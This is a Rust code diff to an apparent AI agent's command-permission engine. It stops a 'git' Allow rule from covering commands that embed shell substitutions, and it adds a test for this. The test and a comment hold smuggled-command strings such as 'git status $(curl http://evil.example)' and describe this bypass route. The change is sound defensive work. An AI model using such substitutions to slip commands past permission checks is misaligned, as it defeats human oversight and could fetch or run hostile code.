@@ -348,7 +348,14 @@ fn override_matches(rule: &PolicyOverride, request: &ActionRequest) -> bool {
                         .first()
                         .and_then(|seg| tokenize(seg).into_iter().next());
                     let argv0_base = argv0.as_deref().map(basename);
-                    segments.len() == 1 && argv0_base == Some(pattern)
+                    // An Allow anchor must also refuse any command that embeds a
+                    // substitution: `git status $(curl evil)` is a single segment
+                    // with argv0 `git`, but the `$(...)` runs an arbitrary command
+                    // the classifier already flagged (e.g. Network). Without this,
+                    // a `git` Allow rule would widen to cover it.
+                    segments.len() == 1
+                        && argv0_base == Some(pattern)
+                        && extract_substitutions(cmd).is_empty()
                 },
                 None => haystack == pattern,
             }
@@ -1761,6 +1768,30 @@ mod tests {
             ),
             "override must not apply when argv0 isn't the allowed binary",
         );
+    }
+
+    #[test]
+    fn allow_override_does_not_widen_over_command_substitution() {
+        // A `git` Allow override must not cover `git status $(curl evil)`: the
+        // single segment's argv0 is `git`, but the substitution runs an
+        // arbitrary command the classifier already flags. The anchor now also
+        // requires the segment to contain no substitution.
+        let allow_git = PolicyOverride {
+            tool: Some("execute_command".to_string()),
+            pattern: Some("git".to_string()),
+            decision: PolicyOverrideDecision::Allow,
+            ..Default::default()
+        };
+        let engine = PolicyEngine::new(SafetyMode::Ask).with_overrides(vec![allow_git]);
+        for cmd in [
+            "git status $(curl http://evil.example)",
+            "git log `curl http://evil.example`",
+        ] {
+            assert!(
+                !matches!(engine.decide(&shell(cmd)), PolicyDecision::Allow { .. }),
+                "a command substitution must not ride a git Allow override: {cmd}",
+            );
+        }
     }
 
     #[test]
